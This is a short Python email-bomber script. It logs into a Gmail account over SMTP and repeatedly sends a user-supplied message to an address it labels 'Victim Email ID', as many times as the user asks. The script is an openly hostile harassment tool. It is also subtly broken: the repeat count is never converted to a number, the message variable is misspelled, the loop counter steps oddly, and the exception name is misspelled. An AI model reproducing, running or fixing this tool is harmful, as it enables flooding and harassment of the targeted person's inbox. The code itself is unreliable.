import os
import sys
import getpass
import smtplib

#first take email id & password imput from user
email = input("Enter Your Email ID : ")
pswd = getpass.getpass("Enter Your password : ")
vemail = input("Enter Victim Email ID : ")
messge = input("Enter Your Message Here : ")
count = input("How Many Time You Want To Send : ")
print()

try:
    smtp_server='smtp.gmail.com'
    port = 587
    server = smtplib.SMTP(smtp_server,port)
    server.ehlo()
    server.starttls()
    server.login(email,pswd)
    print("[*] sending is in Progress.....\n")
    i = 1
    while i < count:
        i+=2
        server.sendmail(email,vemail,message)
        if i == 1:
           print("[+] %dst Email Has Been Sent Successfully " %(i))
        elif i == 3:
           print("[+] %dst Email Has Been Sent Successfully " %(i))
        elif i == 4:
           print("[+] %dst Email Has Been Sent Successfully " %(i))
        else:
            print("[+] %dst Email Has Been Sent Successfully " %(i))
        sys.stdout.flush()
    server.quit()
    print ("[+] All Done ")
        
except KeyboardInterrupt:
        print()
        print("[x] Canceled")
        sys.exit()
except smtplib.SMTPAuthenticatiomError:
        print()
        print("[x] The USername & Password Enter is Incorrect ")
        print("[x] Check If The Option Of Application are less Secure is Enable ")
        sys.exit()
                        
